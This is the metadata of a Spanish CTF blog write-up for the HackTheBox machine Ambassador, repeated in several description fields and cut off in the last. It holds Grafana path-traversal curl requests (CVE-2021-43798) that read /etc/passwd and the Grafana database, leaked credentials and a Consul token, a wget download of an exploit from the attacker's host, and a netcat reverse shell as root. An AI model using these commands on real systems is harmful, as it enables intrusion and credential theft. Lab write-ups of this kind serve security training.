<!DOCTYPE html>













<html lang="es-ES"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Allow having a localized datetime different from the appearance language -->
  

  

    

    

  

  

  
    

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
      
        <!-- `site.img_cdn` is a local file path -->
        
        
      

      

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.1" />
<meta property="og:title" content="Ambassador WriteUp" />
<meta name="author" content="H4ckerLite" />
<meta property="og:locale" content="es_ES" />
<meta name="description" content="Les explicare como comprometer la máquina Ambassador de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con un a vulnerabilidad de tipo Directory Transversal y Arbitrary File Read. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos aprovecharemos de en exploit de Consul con un token que nos lanzará la s hell como root. Escaneo NMAP Empezamos enumerando con NMAP, con ello encontaremos los puertos abiertos y los servicios que se exponen. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.183 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 00:03 -04 Initiating SYN Stealth Scan at 00:03 Scanning 10.10.11.183 [65535 ports] Discovered open port 80/tcp on 10.10.11.183 Discovered open port 3306/tcp on 10.10.11.183 Discovered open port 22/tcp on 10.10.11.183 Discovered open port 3000/tcp on 10.10.11.183 Completed SYN Stealth Scan at 00:03, 17.01s elapsed (65535 total ports) Nmap scan report for 10.10.11.183 Host is up, received user-set (0.32s latency). Scanned at 2023-01-21 00:03:39 -04 for 17s Not shown: 61030 closed tcp ports (reset), 4501 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 3000/tcp open ppp syn-ack ttl 63 3306/tcp open mysql syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds Raw packets sent: 82990 (3.652MB) | Rcvd: 66979 (2.679MB) Puerto 22 su servicio por defecto es SSH, 80 este puerto en su configuración por defecto corre el servicio HTTP, MySQL corre en el puerto 3306 y el puerto 3000 fue asignado por el administrador Enumeración Podemos realizar FUZZING para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encon tramos y tratar de acceder a él. Viendo la web nos encontramos con esto: Grafana Login Viendo en la parte inferior nos da información acerca de la versión, usando searchsploit nos damos cuenta de q ue cuenta con estas vulnerabilidades Directory Traversal and Arbitrary File Read Searchsploit Podemos copiar el script de Python en nuestra carpeta de trabajo e intentamos leer el /etc/passwd 1 2 3 4 5 6 7 8 ❯ searchsploit -m multiple/webapps/50581.py Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read URL: https://www.exploit-db.com/exploits/50581 Path: /snap/searchsploit/62/opt/exploitdb/exploits/multiple/webapps/50581.py Codes: CVE-2021-43798 Verified: False File Type: Python script, ASCII text executable Copied to: /home/h4ckerlite/Desktop/h4ckerlite/HTB/Máquinas/Ambassador/nmap/50581.py Lo ejecutamos… Searchsploit Buscando en internet acerca de este CVE nos encontramos con este blog, nos enseñan a explotarlo de forma manual. 1 2 3 4 ❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash developer:x:1000:1000:developer:/home/developer:/bin/bash Si seguimos leyendo podemos ver que nos podemos descargar la base de datos 1 curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db Ahora procedemos a leer la base de datos, para ello debes tener instalado sqlite3 para verlo desde consola, ya que lo considero mas fácil. 1 sudo apt install sqlite3 Sigueindo las instrucciones del blog leemos la base de datos. 1 sqlite3 grafana.bd Una vez detro de la base de datos, procedemos a leer las tablas 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ❯ sqlite3 grafana.db SQLite version 3.34.1 2021-01-20 14:10:07 Enter &quot;.help&quot; for usage hints. sqlite&gt; .tables alert login_attempt alert_configuration migration_log alert_instance ngalert_configuration alert_notification org alert_notification_state org_user alert_rule playlist alert_rule_tag playlist_item alert_rule_version plugin_setting annotation preferences annotation_tag quota api_key server_lock cache_data session dashboard short_url dashboard_acl star dashboard_provisioning tag dashboard_snapshot team dashboard_tag team_member dashboard_version temp_user data_source test_data kv_store user library_element user_auth library_element_connection user_auth_token sqlite&gt; Usando una query de SQL, leeremos las columnas de la tabla data_source. 1 2 select * from data_source; Veremos algo cómo esto. 1 2 3 sqlite&gt; SELECT * FROM data_source; 2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-20 21:54:47|0|{}|1|uKewFgM4z sqlite&gt; Ganamos acceso Donde el parámetro -h corresponde al host -u al user -p a la contraseña Ahora nos podemos conectar a MySQL debido a que conocemos el user y su contraseña. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 ❯ mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221! Welcome to the MariaDB monitor. Commands end with ; or \g. Your MySQL connection id is 47 Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement. MySQL [(none)]&gt; show databases; +--------------------+ | Database | +--------------------+ | grafana | | information_schema | | mysql | | performance_schema | | sys | | whackywidget | +--------------------+ 6 rows in set (0,172 sec) MySQL [(none)]&gt; use whackywidget; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [whackywidget]&gt; show tables; +------------------------+ | Tables_in_whackywidget | +------------------------+ | users | +------------------------+ 1 row in set (0,396 sec) MySQL [whackywidget]&gt; SELECT * FROM users; +-----------+------------------------------------------+ | user | pass | +-----------+------------------------------------------+ | developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | +-----------+------------------------------------------+ 1 row in set (0,375 sec) MySQL [whackywidget]&gt; Vemos una contraseña, esta se encuentra cifrada en Base64, podemos decifrarla de la siguiente manera. 1 2 echo &quot;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&quot; | base64 -d;echo anEnglishManInNewYork027468 Con esas credenciales podemos conectarnos por SSH. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ❯ ssh developer@10.10.11.183 The authenticity of host &#39;10.10.11.183 (10.10.11.183)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.183&#39; (ECDSA) to the list of known hosts. developer@10.10.11.183&#39;s password: anEnglishManInNewYork027468 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 21 Jan 2023 05:10:23 AM UTC System load: 0.0 Processes: 229 Usage of /: 84.4% of 5.07GB Users logged in: 0 Memory usage: 49% IPv4 address for eth0: 10.10.11.183 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sat Jan 21 00:27:29 2023 from 10.10.14.105 developer@ambassador:~$ export TERM=xterm developer@ambassador:~$ Podemos leer la primara flag. 1 2 3 developer@ambassador:~$ cat user.txt 565**************************1b5 developer@ambassador:~$ Enumeración del sistema En la carpeta home buscamos por carpetas/archivos ocultos y encontramos un archivo de configuración de github. 1 2 3 4 developer@ambassador:~$ ls -a . .. .bash_history .bash_logout .bashrc .cache .gitconfig .gnupg .lesshst .local .profile .ssh snap user.txt developer@ambassador:~$ Si lo leemos nos dice la ruta donde se encuentra. 1 2 3 4 5 6 7 developer@ambassador:~$ cat .gitconfig [user] name = Developer email = developer@ambassador.local [safe] directory = /opt/my-app developer@ambassador:~$ Si nos situamos en la carpeta /opt podemos ver el proyecto github. 1 2 3 developer@ambassador:/opt/my-app$ ls -a . .. .git .gitignore env whackywidget developer@ambassador:/opt/my-app$ Si hacemos un git -log podemos ver los últimos commits que se aplicaron 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 developer@ambassador:/opt/my-app$ git log commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main) Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 23:47:36 2022 +0000 tidy config script commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55 Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 23:44:45 2022 +0000 config script commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 22:47:01 2022 +0000 created project with django CLI commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51 Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 22:44:11 2022 +0000 .gitignore developer@ambassador:/opt/my-app$ Ahora haciendo un git show se nos mostrará información acerca de ese commit. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 developer@ambassador:/opt/my-app$ git show commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main) Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 23:47:36 2022 +0000 tidy config script diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh index 35c08f6..fc51ec0 100755 --- a/whackywidget/put-config-in-consul.sh +++ b/whackywidget/put-config-in-consul.sh @@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app -# Export MYSQL_PASSWORD before running +# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD +consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD developer@ambassador:/opt/my-app$ Ahora con una busqueda en Google encontramos una vía potencial de escalar nuestros privilegios. Escalada de privilegios Usando el exploit de GatoGamer podemos elevar nuestros privilegios, nos descargamos el repositorio de GitHub ** , nos montamos un servidor **HTTP con Python 1 python -m http.server 80 En la máquina víctima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo. 1 2 3 4 5 6 7 8 9 10 11 12 13 developer@ambassador:~$ wget http://10.10.14.61/exploit.py --2023-01-21 05:40:22-- http://10.10.14.61/exploit.py Connecting to 10.10.14.61:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1409 (1.4K) [text/x-python] Saving to: ‘exploit.py.1’ exploit.py.1 100%[=================================================================================================&gt;] 1.38K --.-KB/s in 0s 2023-01-21 05:40:22 (95.1 MB/s) - ‘exploit.py.1’ saved [1409/1409] developer@ambassador:~$ En la máquina víctima ejecutamos lo siguiente. Nota: Recuerda cambiar tu IP de HTB En nuestra máquina host nos ponemos en escucha 1 developer@ambassador:~$ python3 exploit.py --lhost 10.10.14.61 --lport 123 --token bb03b43b-1d81-d62b-24b5-39540ee469b5 1 2 ❯ nc -nlvp 123 listening on [any] 123 ... Al ejecutarlo nos debe llegar la shell como root 1 2 3 4 5 6 ❯ nc -nlvp 123 listening on [any] 123 ... connect to [10.10.14.61] from (UNKNOWN) [10.10.11.183] 58732 bash: cannot set terminal process group (3731): Inappropriate ioctl for device bash: no job control in this shell root@ambassador:/# Ahora podemos vizualizar la flag como root 1 2 3 4 5 root@ambassador:~# ls cleanup.sh root.txt snap root@ambassador:~# cat root.txt 5a4**************************4b1 root@ambassador:~#" />
<meta property="og:description" content="Les explicare como comprometer la máquina Ambassador de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con un a vulnerabilidad de tipo Directory Transversal y Arbitrary File Read. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos aprovecharemos de en exploit de Consul con un token que nos lanzará la s hell como root. Escaneo NMAP Empezamos enumerando con NMAP, con ello encontaremos los puertos abiertos y los servicios que se exponen. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.183 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 00:03 -04 Initiating SYN Stealth Scan at 00:03 Scanning 10.10.11.183 [65535 ports] Discovered open port 80/tcp on 10.10.11.183 Discovered open port 3306/tcp on 10.10.11.183 Discovered open port 22/tcp on 10.10.11.183 Discovered open port 3000/tcp on 10.10.11.183 Completed SYN Stealth Scan at 00:03, 17.01s elapsed (65535 total ports) Nmap scan report for 10.10.11.183 Host is up, received user-set (0.32s latency). Scanned at 2023-01-21 00:03:39 -04 for 17s Not shown: 61030 closed tcp ports (reset), 4501 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 3000/tcp open ppp syn-ack ttl 63 3306/tcp open mysql syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds Raw packets sent: 82990 (3.652MB) | Rcvd: 66979 (2.679MB) Puerto 22 su servicio por defecto es SSH, 80 este puerto en su configuración por defecto corre el servicio HTTP, MySQL corre en el puerto 3306 y el puerto 3000 fue asignado por el administrador Enumeración Podemos realizar FUZZING para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encon tramos y tratar de acceder a él. Viendo la web nos encontramos con esto: Grafana Login Viendo en la parte inferior nos da información acerca de la versión, usando searchsploit nos damos cuenta de q ue cuenta con estas vulnerabilidades Directory Traversal and Arbitrary File Read Searchsploit Podemos copiar el script de Python en nuestra carpeta de trabajo e intentamos leer el /etc/passwd 1 2 3 4 5 6 7 8 ❯ searchsploit -m multiple/webapps/50581.py Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read URL: https://www.exploit-db.com/exploits/50581 Path: /snap/searchsploit/62/opt/exploitdb/exploits/multiple/webapps/50581.py Codes: CVE-2021-43798 Verified: False File Type: Python script, ASCII text executable Copied to: /home/h4ckerlite/Desktop/h4ckerlite/HTB/Máquinas/Ambassador/nmap/50581.py Lo ejecutamos… Searchsploit Buscando en internet acerca de este CVE nos encontramos con este blog, nos enseñan a explotarlo de forma manual. 1 2 3 4 ❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash developer:x:1000:1000:developer:/home/developer:/bin/bash Si seguimos leyendo podemos ver que nos podemos descargar la base de datos 1 curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db Ahora procedemos a leer la base de datos, para ello debes tener instalado sqlite3 para verlo desde consola, ya que lo considero mas fácil. 1 sudo apt install sqlite3 Sigueindo las instrucciones del blog leemos la base de datos. 1 sqlite3 grafana.bd Una vez detro de la base de datos, procedemos a leer las tablas 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ❯ sqlite3 grafana.db SQLite version 3.34.1 2021-01-20 14:10:07 Enter &quot;.help&quot; for usage hints. sqlite&gt; .tables alert login_attempt alert_configuration migration_log alert_instance ngalert_configuration alert_notification org alert_notification_state org_user alert_rule playlist alert_rule_tag playlist_item alert_rule_version plugin_setting annotation preferences annotation_tag quota api_key server_lock cache_data session dashboard short_url dashboard_acl star dashboard_provisioning tag dashboard_snapshot team dashboard_tag team_member dashboard_version temp_user data_source test_data kv_store user library_element user_auth library_element_connection user_auth_token sqlite&gt; Usando una query de SQL, leeremos las columnas de la tabla data_source. 1 2 select * from data_source; Veremos algo cómo esto. 1 2 3 sqlite&gt; SELECT * FROM data_source; 2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-20 21:54:47|0|{}|1|uKewFgM4z sqlite&gt; Ganamos acceso Donde el parámetro -h corresponde al host -u al user -p a la contraseña Ahora nos podemos conectar a MySQL debido a que conocemos el user y su contraseña. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 ❯ mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221! Welcome to the MariaDB monitor. Commands end with ; or \g. Your MySQL connection id is 47 Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement. MySQL [(none)]&gt; show databases; +--------------------+ | Database | +--------------------+ | grafana | | information_schema | | mysql | | performance_schema | | sys | | whackywidget | +--------------------+ 6 rows in set (0,172 sec) MySQL [(none)]&gt; use whackywidget; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [whackywidget]&gt; show tables; +------------------------+ | Tables_in_whackywidget | +------------------------+ | users | +------------------------+ 1 row in set (0,396 sec) MySQL [whackywidget]&gt; SELECT * FROM users; +-----------+------------------------------------------+ | user | pass | +-----------+------------------------------------------+ | developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | +-----------+------------------------------------------+ 1 row in set (0,375 sec) MySQL [whackywidget]&gt; Vemos una contraseña, esta se encuentra cifrada en Base64, podemos decifrarla de la siguiente manera. 1 2 echo &quot;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&quot; | base64 -d;echo anEnglishManInNewYork027468 Con esas credenciales podemos conectarnos por SSH. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ❯ ssh developer@10.10.11.183 The authenticity of host &#39;10.10.11.183 (10.10.11.183)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.183&#39; (ECDSA) to the list of known hosts. developer@10.10.11.183&#39;s password: anEnglishManInNewYork027468 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 21 Jan 2023 05:10:23 AM UTC System load: 0.0 Processes: 229 Usage of /: 84.4% of 5.07GB Users logged in: 0 Memory usage: 49% IPv4 address for eth0: 10.10.11.183 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sat Jan 21 00:27:29 2023 from 10.10.14.105 developer@ambassador:~$ export TERM=xterm developer@ambassador:~$ Podemos leer la primara flag. 1 2 3 developer@ambassador:~$ cat user.txt 565**************************1b5 developer@ambassador:~$ Enumeración del sistema En la carpeta home buscamos por carpetas/archivos ocultos y encontramos un archivo de configuración de github. 1 2 3 4 developer@ambassador:~$ ls -a . .. .bash_history .bash_logout .bashrc .cache .gitconfig .gnupg .lesshst .local .profile .ssh snap user.txt developer@ambassador:~$ Si lo leemos nos dice la ruta donde se encuentra. 1 2 3 4 5 6 7 developer@ambassador:~$ cat .gitconfig [user] name = Developer email = developer@ambassador.local [safe] directory = /opt/my-app developer@ambassador:~$ Si nos situamos en la carpeta /opt podemos ver el proyecto github. 1 2 3 developer@ambassador:/opt/my-app$ ls -a . .. .git .gitignore env whackywidget developer@ambassador:/opt/my-app$ Si hacemos un git -log podemos ver los últimos commits que se aplicaron 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 developer@ambassador:/opt/my-app$ git log commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main) Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 23:47:36 2022 +0000 tidy config script commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55 Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 23:44:45 2022 +0000 config script commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 22:47:01 2022 +0000 created project with django CLI commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51 Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 22:44:11 2022 +0000 .gitignore developer@ambassador:/opt/my-app$ Ahora haciendo un git show se nos mostrará información acerca de ese commit. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 developer@ambassador:/opt/my-app$ git show commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main) Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 23:47:36 2022 +0000 tidy config script diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh index 35c08f6..fc51ec0 100755 --- a/whackywidget/put-config-in-consul.sh +++ b/whackywidget/put-config-in-consul.sh @@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app -# Export MYSQL_PASSWORD before running +# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD +consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD developer@ambassador:/opt/my-app$ Ahora con una busqueda en Google encontramos una vía potencial de escalar nuestros privilegios. Escalada de privilegios Usando el exploit de GatoGamer podemos elevar nuestros privilegios, nos descargamos el repositorio de GitHub ** , nos montamos un servidor **HTTP con Python 1 python -m http.server 80 En la máquina víctima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo. 1 2 3 4 5 6 7 8 9 10 11 12 13 developer@ambassador:~$ wget http://10.10.14.61/exploit.py --2023-01-21 05:40:22-- http://10.10.14.61/exploit.py Connecting to 10.10.14.61:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1409 (1.4K) [text/x-python] Saving to: ‘exploit.py.1’ exploit.py.1 100%[=================================================================================================&gt;] 1.38K --.-KB/s in 0s 2023-01-21 05:40:22 (95.1 MB/s) - ‘exploit.py.1’ saved [1409/1409] developer@ambassador:~$ En la máquina víctima ejecutamos lo siguiente. Nota: Recuerda cambiar tu IP de HTB En nuestra máquina host nos ponemos en escucha 1 developer@ambassador:~$ python3 exploit.py --lhost 10.10.14.61 --lport 123 --token bb03b43b-1d81-d62b-24b5-39540ee469b5 1 2 ❯ nc -nlvp 123 listening on [any] 123 ... Al ejecutarlo nos debe llegar la shell como root 1 2 3 4 5 6 ❯ nc -nlvp 123 listening on [any] 123 ... connect to [10.10.14.61] from (UNKNOWN) [10.10.11.183] 58732 bash: cannot set terminal process group (3731): Inappropriate ioctl for device bash: no job control in this shell root@ambassador:/# Ahora podemos vizualizar la flag como root 1 2 3 4 5 root@ambassador:~# ls cleanup.sh root.txt snap root@ambassador:~# cat root.txt 5a4**************************4b1 root@ambassador:~#" />
<link rel="canonical" href="http://localhost:4000/posts/ambassador-writeup/" />
<meta property="og:url" content="http://localhost:4000/posts/ambassador-writeup/" />
<meta property="og:site_name" content="H4ckerLite Blog" />
<meta property="og:image" content="http://localhost:4000/assets/img/commons/ambassador-writeup/Ambassador.png" />
<meta property="og:image:alt" content="Ambassador WriteUp" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-01-16T17:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/commons/ambassador-writeup/Ambassador.png" />
<meta name="twitter:image:alt" content="Ambassador WriteUp" />
<meta property="twitter:title" content="Ambassador WriteUp" />
<meta name="twitter:site" content="@mortzelo" />
<meta name="twitter:creator" content="@H4ckerLite" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-02-04T21:12:54+01:00","datePublished":"2023-01-16T17:00:00+01:00","description":"Les explicare como comprometer la máquina Ambassador de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con un a vulnerabilidad de tipo Directory Transversal y Arbitrary File Read. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos aprovecharemos de en exploit de Consul con un token que nos lanzará la s hell como root. Escaneo NMAP Empezamos enumerando con NMAP, con ello encontaremos los puertos abiertos y los servicios que se exponen. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.183 -oG allPorts Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 00:03 -04 Initiating SYN Stealth Scan at 00:03 Scanning 10.10.11.183 [65535 ports] Discovered open port 80/tcp on 10.10.11.183 Discovered open port 3306/tcp on 10.10.11.183 Discovered open port 22/tcp on 10.10.11.183 Discovered open port 3000/tcp on 10.10.11.183 Completed SYN Stealth Scan at 00:03, 17.01s elapsed (65535 total ports) Nmap scan report for 10.10.11.183 Host is up, received user-set (0.32s latency). Scanned at 2023-01-21 00:03:39 -04 for 17s Not shown: 61030 closed tcp ports (reset), 4501 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 3000/tcp open ppp syn-ack ttl 63 3306/tcp open mysql syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds Raw packets sent: 82990 (3.652MB) | Rcvd: 66979 (2.679MB) Puerto 22 su servicio por defecto es SSH, 80 este puerto en su configuración por defecto corre el servicio HTTP, MySQL corre en el puerto 3306 y el puerto 3000 fue asignado por el administrador Enumeración Podemos realizar FUZZING para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encon tramos y tratar de acceder a él. Viendo la web nos encontramos con esto: Grafana Login Viendo en la parte inferior nos da información acerca de la versión, usando searchsploit nos damos cuenta de q ue cuenta con estas vulnerabilidades Directory Traversal and Arbitrary File Read Searchsploit Podemos copiar el script de Python en nuestra carpeta de trabajo e intentamos leer el /etc/passwd 1 2 3 4 5 6 7 8 ❯ searchsploit -m multiple/webapps/50581.py Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read URL: https://www.exploit-db.com/exploits/50581 Path: /snap/searchsploit/62/opt/exploitdb/exploits/multiple/webapps/50581.py Codes: CVE-2021-43798 Verified: False File Type: Python script, ASCII text executable Copied to: /home/h4ckerlite/Desktop/h4ckerlite/HTB/Máquinas/Ambassador/nmap/50581.py Lo ejecutamos… Searchsploit Buscando en internet acerca de este CVE nos encontramos con este blog, nos enseñan a explotarlo de forma manual. 1 2 3 4 ❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash developer:x:1000:1000:developer:/home/developer:/bin/bash Si seguimos leyendo podemos ver que nos podemos descargar la base de datos 1 curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db Ahora procedemos a leer la base de datos, para ello debes tener instalado sqlite3 para verlo desde consola, ya que lo considero mas fácil. 1 sudo apt install sqlite3 Sigueindo las instrucciones del blog leemos la base de datos. 1 sqlite3 grafana.bd Una vez detro de la base de datos, procedemos a leer las tablas 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ❯ sqlite3 grafana.db SQLite version 3.34.1 2021-01-20 14:10:07 Enter &quot;.help&quot; for usage hints. sqlite&gt; .tables alert login_attempt alert_configuration migration_log alert_instance ngalert_configuration alert_notification org alert_notification_state org_user alert_rule playlist alert_rule_tag playlist_item alert_rule_version plugin_setting annotation preferences annotation_tag quota api_key server_lock cache_data session dashboard short_url dashboard_acl star dashboard_provisioning tag dashboard_snapshot team dashboard_tag team_member dashboard_version temp_user data_source test_data kv_store user library_element user_auth library_element_connection user_auth_token sqlite&gt; Usando una query de SQL, leeremos las columnas de la tabla data_source. 1 2 select * from data_source; Veremos algo cómo esto. 1 2 3 sqlite&gt; SELECT * FROM data_source; 